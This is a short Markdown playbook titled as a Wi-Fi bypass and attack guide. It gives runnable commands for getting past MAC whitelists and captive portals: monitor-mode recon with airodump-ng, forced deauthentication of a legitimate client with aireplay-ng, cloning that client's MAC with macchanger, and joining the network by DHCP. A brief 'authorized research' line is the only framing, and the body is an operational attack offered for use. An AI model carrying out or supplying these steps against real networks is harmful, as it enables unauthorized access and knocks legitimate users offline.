# Complete Wi-Fi Bypass & Operational Attack Playbook

Comprehensive operational methodology for authorized research and automated network access simulation.

## Overview
This playbook outlines the exact step-by-step methodologies to bypass wireless access point controls, including MAC filtering and captive portals, through reconnaissance, client emulation, and automated script execution.

---

## Method 1: MAC Whitelist & Captive Portal Bypass (Client Cloning)

### Step 1: Wireless Interface Preparation
Kill conflicting network manager processes and enable monitor mode to inspect nearby traffic:
```bash
airmon-ng check kill
airmon-ng start wlan0
```

### Step 2: Target Station & BSSID Reconnaissance
Identify active clients associated with the target Access Point:
```bash
airodump-ng --bssid [TARGET_BSSID] --channel [CHANNEL] wlan0mon
```
*Note down a valid, active client MAC address (`STATION`).*

### Step 3: Deauthentication & Disassociation (Optional)
Force the legitimate client to disconnect, prompting a re-authentication handshake or clearing stale sessions:
```bash
aireplay-ng --deauth 5 -a [TARGET_BSSID] -c [CLIENT_MAC] wlan0mon
```

### Step 4: MAC Spoofing / Identity Cloning
Bring down your local wireless interface, change its MAC address to match the authenticated client, and bring it back up:
```bash
ifconfig wlan0 down
macchanger -m [CLIENT_MAC] wlan0
ifconfig wlan0 up
```

### Step 5: Network Association & DHCP Lease
Connect to the target SSID using the spoofed MAC address and request an IP lease:
```bash
iwconfig wlan0 essid "[TARGET_SSID]"
dhclient -v wlan0
```

---

## Automated Execution (`wifi_auto_bypass.py`)
Refer to the repository file `wifi_auto_bypass.py` for a fully automated script that handles interface down, MAC spoofing, and DHCP lease request in a single execution.
